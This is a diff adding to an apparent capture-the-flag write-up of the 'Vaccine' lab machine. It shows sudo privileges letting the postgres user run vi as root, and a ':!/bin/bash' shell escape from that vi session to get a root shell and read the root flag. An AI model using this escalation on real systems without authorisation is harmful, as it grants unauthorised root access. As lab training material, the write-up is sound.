@@ -361,11 +361,42 @@ applicable law.
 postgres@vaccine:~$ ls
 11  user.txt
 postgres@vaccine:~$ 
-
-postgres@vaccine:~$ cat user.txt
-139d3e5c3#######################                                                                   
-postgres@vaccine:~$                
+             
 ```
+
+Turns out that is not the correct user.txt but the user account and password for postgres can be used to see privs
+
+This password can be used to view the user's sudo privileges.
+
+```yaml
+postgres@vaccine:~$ sudo -l
+[sudo] password for postgres: <enter password>
+Matching Defaults entries for postgres on vaccine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+VI is run as root so if we open this file and then just close it with 
+
+```yaml
+:!/bin/bash
+```
+
+hit return and it closes and we are not root
+
+```yaml
+root@vaccine:/home# cd /root
+root@vaccine:~# ls
+pg_hba.conf  root.txt  snap
+root@vaccine:~# cat root.txt
+dd6e058e81426################
+```
+
 
 
 
